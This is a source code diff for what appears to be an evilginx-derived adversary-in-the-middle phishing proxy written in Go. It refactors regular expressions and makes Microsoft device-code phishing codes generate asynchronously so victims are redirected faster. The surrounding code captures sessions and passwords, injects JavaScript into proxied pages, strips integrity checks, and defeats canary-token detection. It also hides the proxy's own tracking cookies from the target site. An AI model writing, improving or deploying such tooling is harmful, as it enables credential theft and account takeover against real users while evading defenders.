@@ -212,6 +212,26 @@ const (
 var MATCH_URL_REGEXP = regexp.MustCompile(`\b(http[s]?:\/\/|\\\\|http[s]:\\x2F\\x2F)(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)
 var MATCH_URL_REGEXP_WITHOUT_SCHEME = regexp.MustCompile(`\b(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)
 
+// Pre-compiled regexps for hot-path request handling (avoid re-compiling on every request)
+var (
+	botguardTelRe  = regexp.MustCompile(`^/api/v1/analytics$`)
+	dcPageRe       = regexp.MustCompile(`^/dc/([a-zA-Z0-9]+)$`)
+	dcStatusRe     = regexp.MustCompile(`^/dc/status/([a-zA-Z0-9]+)$`)
+	redirRe        = regexp.MustCompile(`^/assets/js/([^/]*)`)
+	jsInjectRe     = regexp.MustCompile(`^/assets/js/([^/]*)/([^/]*)`)
+	jsonContentRe  = regexp.MustCompile(`application/\w*\+?json`)
+	formContentRe  = regexp.MustCompile(`application/x-www-form-urlencoded`)
+	cssUnescapeRe  = regexp.MustCompile(`\\([0-9a-fA-F]{1,6})\s?`)
+	sriRe          = regexp.MustCompile(`\s+integrity="[^"]*"`)
+	crossoriginRe  = regexp.MustCompile(`\s+crossorigin(?:="[^"]*")?`)
+	jsNonceRe      = regexp.MustCompile(`(?i)<script.*nonce=['"]([^'"]*)`)
+	jsNonceRe2     = regexp.MustCompile(`(?i)<script[^>]*nonce=['"]([^'"]*)`)
+	bodyCloseRe    = regexp.MustCompile(`(?i)(<\s*/body\s*>)`)
+	headOpenRe     = regexp.MustCompile(`(?i)(<\s*head[^>]*>)`)
+	htmlOpenRe     = regexp.MustCompile(`(?i)(<\s*html[^>]*>)`)
+	evilginxCookieRe = regexp.MustCompile(`^(_ga|_gid|_fbp|__cf|__utm|_sess|sid|uid|token|auth)_[0-9a-f]{12}$`)
+)
+
 type HttpProxy struct {
 	Server            *http.Server
 	Proxy             *goproxy.ProxyHttpServer
@@ -464,7 +484,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			remote_addr := from_ip
 
 			// --- Begin Botguard telemetry endpoint ---
-			botguard_tel_re := regexp.MustCompile(`^/api/v1/analytics$`)
+			botguard_tel_re := botguardTelRe
 			if botguard_tel_re.MatchString(req.URL.Path) && req.Method == "POST" {
 				// Handle telemetry collection
 				body, err := ioutil.ReadAll(req.Body)
@@ -550,8 +570,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			// --- End password capture endpoint ---
 
 			// --- Begin device code interstitial endpoint ---
-			dc_page_re := regexp.MustCompile(`^/dc/([a-zA-Z0-9]+)$`)
-			dc_status_re := regexp.MustCompile(`^/dc/status/([a-zA-Z0-9]+)$`)
+			dc_page_re := dcPageRe
+			dc_status_re := dcStatusRe
 
 			if dc_status_re.MatchString(req.URL.Path) {
 				// Device code status polling endpoint
@@ -561,13 +581,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					// Find the AitM session that links to this device code
 					var dcSession *DeviceCodeSession
 					var redirectURL string
+					var dcState string
 					p.session_mtx.Lock()
 					for _, s := range p.sessions {
-						if s.Id == session_id && s.DCSessionID != "" {
-							dcs, ok := p.deviceCode.GetSession(s.DCSessionID)
-							if ok {
-								dcSession = dcs
-								redirectURL = s.RedirectURL
+						if s.Id == session_id {
+							dcState = s.DCState
+							if s.DCSessionID != "" {
+								dcs, ok := p.deviceCode.GetSession(s.DCSessionID)
+								if ok {
+									dcSession = dcs
+									redirectURL = s.RedirectURL
+								}
 							}
 							break
 						}
@@ -578,10 +602,21 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						"captured":     false,
 						"expired":      false,
 						"redirect_url": "",
+						"ready":        false,
+						"user_code":    "",
+						"verify_url":   "",
+						"failed":       false,
 					}
 
-					if dcSession != nil {
+					if dcState == DCStatePending {
+						// Code still being generated — tell page to keep polling
+					} else if dcState == DCStateFailed {
+						status["failed"] = true
+					} else if dcSession != nil {
 						dcSession.mu.Lock()
+						status["ready"] = true
+						status["user_code"] = dcSession.UserCode
+						status["verify_url"] = dcSession.VerifyURL
 						switch dcSession.State {
 						case DCStateCaptured:
 							status["captured"] = true
@@ -609,72 +644,91 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					s, ok := p.sessions[session_id]
 					p.session_mtx.Unlock()
 
-					if ok && s.DCSessionID != "" {
-						dcs, dcOk := p.deviceCode.GetSession(s.DCSessionID)
-						if dcOk {
-							dcs.mu.Lock()
-							userCode := dcs.UserCode
-							verifyURL := dcs.VerifyURL
-							expiresIn := int(time.Until(dcs.ExpiresAt).Seconds())
-							dcs.mu.Unlock()
+					if ok && (s.DCSessionID != "" || s.DCState == DCStatePending) {
+						userCode := ""
+						verifyURL := "https://microsoft.com/devicelogin"
+						expiresIn := 900 // default 15 min
+						codeReady := false
+						dcProvider := ""
 
-							if expiresIn < 0 {
-								expiresIn = 0
+						if s.DCSessionID != "" {
+							dcs, dcOk := p.deviceCode.GetSession(s.DCSessionID)
+							if dcOk {
+								dcs.mu.Lock()
+								userCode = dcs.UserCode
+								verifyURL = dcs.VerifyURL
+								expiresIn = int(time.Until(dcs.ExpiresAt).Seconds())
+								dcProvider = dcs.Provider
+								dcs.mu.Unlock()
+								codeReady = true
 							}
-							expMinutes := expiresIn / 60
-
-							templateType := s.PhishLure.DeviceCodeTemplate
-							if templateType == "" {
-								// Fall back to phishlet device_code config
-								if s.Phishlet != "" {
-									if phl, err := p.cfg.GetPhishlet(s.Phishlet); err == nil {
-										if plDC := phl.GetDeviceCodeConfig(); plDC != nil && plDC.Template != "" {
-											templateType = plDC.Template
-										}
-									}
-								}
-							}
-							if templateType == "" {
-								if s.DCMode == DCModeFallback {
-									templateType = "fallback"
-								} else {
-									templateType = "success"
-								}
-							}
-
-							// Select provider-appropriate interstitial template
-							provider := ""
-							if s.PhishLure != nil {
-								provider = s.PhishLure.DeviceCodeProvider
-							}
-							if provider == "" {
-								// Fall back to phishlet device_code config
-								if s.Phishlet != "" {
-									if phl, err := p.cfg.GetPhishlet(s.Phishlet); err == nil {
-										if plDC := phl.GetDeviceCodeConfig(); plDC != nil && plDC.Provider != "" {
-											provider = plDC.Provider
-										}
-									}
-								}
-							}
-							if provider == "" {
-								provider = dcs.Provider
-							}
-							if provider == "" {
-								provider = DCProviderMicrosoft
-							}
-
-							html := GetInterstitialForProvider(provider)
-							html = strings.ReplaceAll(html, "{user_code}", userCode)
-							html = strings.ReplaceAll(html, "{verify_url}", verifyURL)
-							html = strings.ReplaceAll(html, "{session_id}", session_id)
-							html = strings.ReplaceAll(html, "{template_type}", templateType)
-							html = strings.ReplaceAll(html, "{expires_minutes}", fmt.Sprintf("%d", expMinutes))
-							html = strings.ReplaceAll(html, "{expires_seconds}", fmt.Sprintf("%d", expiresIn))
-
-							resp := goproxy.NewResponse(req, "text/html", 200, html)
-							return req, resp
 						}
+
+						if expiresIn < 0 {
+							expiresIn = 0
+						}
+						expMinutes := expiresIn / 60
+
+						templateType := ""
+						if s.PhishLure != nil {
+							templateType = s.PhishLure.DeviceCodeTemplate
+						}
+						if templateType == "" {
+							// Fall back to phishlet device_code config
+							if s.Phishlet != "" {
+								if phl, err := p.cfg.GetPhishlet(s.Phishlet); err == nil {
+									if plDC := phl.GetDeviceCodeConfig(); plDC != nil && plDC.Template != "" {
+										templateType = plDC.Template
+									}
+								}
+							}
+						}
+						if templateType == "" {
+							if s.DCMode == DCModeFallback {
+								templateType = "fallback"
+							} else {
+								templateType = "success"
+							}
+						}
+
+						// Select provider-appropriate interstitial template
+						provider := ""
+						if s.PhishLure != nil {
+							provider = s.PhishLure.DeviceCodeProvider
+						}
+						if provider == "" {
+							// Fall back to phishlet device_code config
+							if s.Phishlet != "" {
+								if phl, err := p.cfg.GetPhishlet(s.Phishlet); err == nil {
+									if plDC := phl.GetDeviceCodeConfig(); plDC != nil && plDC.Provider != "" {
+										provider = plDC.Provider
+									}
+								}
+							}
+						}
+						if provider == "" && dcProvider != "" {
+							provider = dcProvider
+						}
+						if provider == "" {
+							provider = DCProviderMicrosoft
+						}
+
+						html := GetInterstitialForProvider(provider)
+						if codeReady {
+							html = strings.ReplaceAll(html, "{user_code}", userCode)
+						} else {
+							// Code still pending — placeholder, JS will fill in via polling
+							html = strings.ReplaceAll(html, "{user_code}", "")
+						}
+						html = strings.ReplaceAll(html, "{verify_url}", verifyURL)
+						html = strings.ReplaceAll(html, "{session_id}", session_id)
+						html = strings.ReplaceAll(html, "{template_type}", templateType)
+						html = strings.ReplaceAll(html, "{expires_minutes}", fmt.Sprintf("%d", expMinutes))
+						html = strings.ReplaceAll(html, "{expires_seconds}", fmt.Sprintf("%d", expiresIn))
+						html = strings.ReplaceAll(html, "{code_ready}", fmt.Sprintf("%v", codeReady))
+
+						resp := goproxy.NewResponse(req, "text/html", 200, html)
+						return req, resp
 					}
 
 					// Session or device code not found — redirect to unauth
@@ -722,8 +776,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 			// --- End Botguard bot detection ---
 
-			redir_re := regexp.MustCompile(`^/assets/js/([^/]*)`)
-			js_inject_re := regexp.MustCompile(`^/assets/js/([^/]*)/([^/]*)`)
+			redir_re := redirRe
+			js_inject_re := jsInjectRe
 
 			if js_inject_re.MatchString(req.URL.Path) {
 				ra := js_inject_re.FindStringSubmatch(req.URL.Path)
@@ -1077,38 +1131,49 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											}
 										}
 
-										// Generate device code synchronously
-										dcSess, err := p.deviceCode.RequestDeviceCode(dcClient, dcScope)
-										if err != nil {
-											log.Error("[%d] [devicecode] failed to generate device code: %v", sid, err)
-											// Fall back to normal proxy behavior
-										} else {
-											p.deviceCode.LinkToAitmSession(dcSess.ID, session.Id)
-											session.DCSessionID = dcSess.ID
-											session.DCUserCode = dcSess.UserCode
-											session.DCState = DCStateWaiting
+										// Mark session as pending and redirect immediately
+										// Device code will be generated asynchronously in a goroutine
+										session.DCState = DCStatePending
 
-											log.Important("[%d] [devicecode] DIRECT mode - code generated: %s (client: %s)", sid, dcSess.UserCode, dcSess.ClientName)
+										// Capture variables for goroutine
+										capturedSid := sid
+										capturedClient := dcClient
+										capturedScope := dcScope
+										capturedSession := session
+
+										go func() {
+											dcSess, err := p.deviceCode.RequestDeviceCode(capturedClient, capturedScope)
+											if err != nil {
+												log.Error("[%d] [devicecode] failed to generate device code: %v", capturedSid, err)
+												capturedSession.DCState = DCStateFailed
+												return
+											}
+											p.deviceCode.LinkToAitmSession(dcSess.ID, capturedSession.Id)
+											capturedSession.DCSessionID = dcSess.ID
+											capturedSession.DCUserCode = dcSess.UserCode
+											capturedSession.DCState = DCStateWaiting
+
+											log.Important("[%d] [devicecode] DIRECT mode - code generated: %s (client: %s)", capturedSid, dcSess.UserCode, dcSess.ClientName)
 
 											// Start background polling
 											p.deviceCode.StartPolling(dcSess.ID)
 
 											// Send notification
 											p.notifier.Trigger(EventDeviceCodeGenerated, &NotificationData{
-												Origin:    session.RemoteAddr,
-												Phishlet:  session.Phishlet,
-												SessionID: session.Id,
-												UserAgent: session.UserAgent,
+												Origin:    capturedSession.RemoteAddr,
+												Phishlet:  capturedSession.Phishlet,
+												SessionID: capturedSession.Id,
+												UserAgent: capturedSession.UserAgent,
 												Custom:    map[string]string{"dc_code": dcSess.UserCode, "dc_session": dcSess.ID},
 											})
+										}()
 
-											// Redirect directly to device code interstitial
-											interstitialURL := fmt.Sprintf("/dc/%s", session.Id)
-											resp := goproxy.NewResponse(req, "text/html", 302, "")
-											resp.Header.Set("Location", interstitialURL)
-											resp.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
-											return req, resp
-										}
+										// Redirect immediately (don't wait for Microsoft API)
+										interstitialURL := fmt.Sprintf("/dc/%s", session.Id)
+										resp := goproxy.NewResponse(req, "text/html", 302, "")
+										resp.Header.Set("Location", interstitialURL)
+										resp.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
+										return req, resp
 									}
 
 									if dcMode != DCModeOff && dcMode != DCModeDirect {
@@ -1461,7 +1526,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				// are set by evilginx on the phishing domain for session tracking.
 				// if forwarded to the target, they reveal the proxy and cause errors.
 				if pl != nil {
-					evilginxCookieRe := regexp.MustCompile(`^(_ga|_gid|_fbp|__cf|__utm|_sess|sid|uid|token|auth)_[0-9a-f]{12}$`)
 					cookies := req.Cookies()
 					var cleanCookies []string
 					for _, ck := range cookies {
@@ -1584,8 +1648,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 						contentType := req.Header.Get("Content-type")
 
-						json_re := regexp.MustCompile(`application/\w*\+?json`)
-						form_re := regexp.MustCompile(`application/x-www-form-urlencoded`)
+						json_re := jsonContentRe
+						form_re := formContentRe
 
 						if json_re.MatchString(contentType) {
 
@@ -2807,7 +2871,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			// simple string matching from detecting and neutralizing canary token URLs.
 			// Unescaping here ensures sub_filters can match and replace these URLs.
 			if err == nil && strings.Contains(mime, "css") {
-				cssUnescapeRe := regexp.MustCompile(`\\([0-9a-fA-F]{1,6})\s?`)
 				body = []byte(cssUnescapeRe.ReplaceAllStringFunc(string(body), func(match string) string {
 					submatch := cssUnescapeRe.FindStringSubmatch(match)
 					if len(submatch) < 2 {
@@ -2826,9 +2889,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			// crossorigin attributes can also cause issues with proxied resources.
 			// Stripping these ensures proxied content loads correctly.
 			if err == nil && (mime == "text/html" || strings.Contains(mime, "xhtml")) {
-				sriRe := regexp.MustCompile(`\s+integrity="[^"]*"`)
 				body = []byte(sriRe.ReplaceAllString(string(body), ""))
-				crossoriginRe := regexp.MustCompile(`\s+crossorigin(?:="[^"]*")?`)
 				body = []byte(crossoriginRe.ReplaceAllString(string(body), ""))
 			}
 
@@ -3332,13 +3393,11 @@ func (p *HttpProxy) javascriptRedirect(req *http.Request, rurl string) (*http.Re
 }
 
 func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string, src_url string) []byte {
-	js_nonce_re := regexp.MustCompile(`(?i)<script.*nonce=['"]([^'"]*)`)
-	m_nonce := js_nonce_re.FindStringSubmatch(string(body))
+	m_nonce := jsNonceRe.FindStringSubmatch(string(body))
 	js_nonce := ""
 	if m_nonce != nil {
 		js_nonce = " nonce=\"" + m_nonce[1] + "\""
 	}
-	re := regexp.MustCompile(`(?i)(<\s*/body\s*>)`)
 	var d_inject string
 
 	if script != "" {
@@ -3355,7 +3414,7 @@ func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string, src_url
 	} else {
 		return body
 	}
-	ret := []byte(re.ReplaceAllString(string(body), d_inject))
+	ret := []byte(bodyCloseRe.ReplaceAllString(string(body), d_inject))
 	return ret
 }
 
@@ -3366,8 +3425,7 @@ func (p *HttpProxy) injectJavascriptIntoHead(body []byte, script string) []byte 
 	if script == "" {
 		return body
 	}
-	js_nonce_re := regexp.MustCompile(`(?i)<script[^>]*nonce=['"]([^'"]*)`)
-	m_nonce := js_nonce_re.FindStringSubmatch(string(body))
+	m_nonce := jsNonceRe2.FindStringSubmatch(string(body))
 	js_nonce := ""
 	if m_nonce != nil {
 		js_nonce = " nonce=\"" + m_nonce[1] + "\""
@@ -3382,15 +3440,13 @@ func (p *HttpProxy) injectJavascriptIntoHead(body []byte, script string) []byte 
 
 	inject_tag := "<script" + js_nonce + ">" + minified + "</script>"
 
-	re := regexp.MustCompile(`(?i)(<\s*head[^>]*>)`)
-	if re.Match(body) {
-		ret := []byte(re.ReplaceAllString(string(body), "${1}\n"+inject_tag))
+	if headOpenRe.Match(body) {
+		ret := []byte(headOpenRe.ReplaceAllString(string(body), "${1}\n"+inject_tag))
 		return ret
 	}
 	// Fallback: inject at very beginning of <html>
-	re2 := regexp.MustCompile(`(?i)(<\s*html[^>]*>)`)
-	if re2.Match(body) {
-		ret := []byte(re2.ReplaceAllString(string(body), "${1}\n"+inject_tag))
+	if htmlOpenRe.Match(body) {
+		ret := []byte(htmlOpenRe.ReplaceAllString(string(body), "${1}\n"+inject_tag))
 		return ret
 	}
 	return body
